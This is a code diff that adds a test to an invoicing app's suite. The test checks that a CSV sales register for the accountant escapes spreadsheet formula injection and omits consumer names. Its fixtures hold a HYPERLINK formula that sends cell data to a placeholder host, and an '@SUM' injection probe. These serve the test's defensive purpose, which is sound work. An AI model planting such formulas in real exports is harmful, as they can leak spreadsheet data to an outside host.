@@ -109,3 +109,20 @@ describe('series, periods and due dates', () => {
     expect(dueDate(q, 'quarterly').toISOString()).toBe('2027-01-12T18:30:00.000Z')
   })
 })
+
+describe('the CA files are safe to open', () => {
+  it('a buyer name that looks like a formula is text in the CSV; negative amounts stay numbers', () => {
+    const evil = inv('KS/26-27/00099', [line(100_000, 500, 'intra')], { gstin: '08ABCFS4421K1Z7' })
+    evil.buyer = { ...evil.buyer, business: '=HYPERLINK("https://x.example/?"&H2,"Open")' }
+    const note = inv('KS/26-27/C0099', [line(100_000, 500, 'intra')], { gstin: '08ABCFS4421K1Z7', credit: { against: 'KS/26-27/00099' } })
+    note.buyer = { ...note.buyer, business: '@SUM(1+1)\r' }
+    const reg = salesRegister([evil], [note])
+    expect(reg).toContain(`"'=HYPERLINK(""https://x.example/?""&H2,""Open"")"`)
+    expect(reg).toContain(`"'@SUM(1+1)\r"`)
+    expect(reg).toMatch(/,-1000,/)
+    expect(reg).not.toMatch(/,=/)
+    // A consumer's name never reaches the CA's register (GSTR-1 needs none).
+    const b2c = inv('KS/26-27/00100', [line(100_000, 500, 'intra')]); b2c.buyer = { ...b2c.buyer, name: 'Riya Shopper' }
+    expect(salesRegister([b2c], [])).not.toContain('Riya Shopper')
+  })
+})
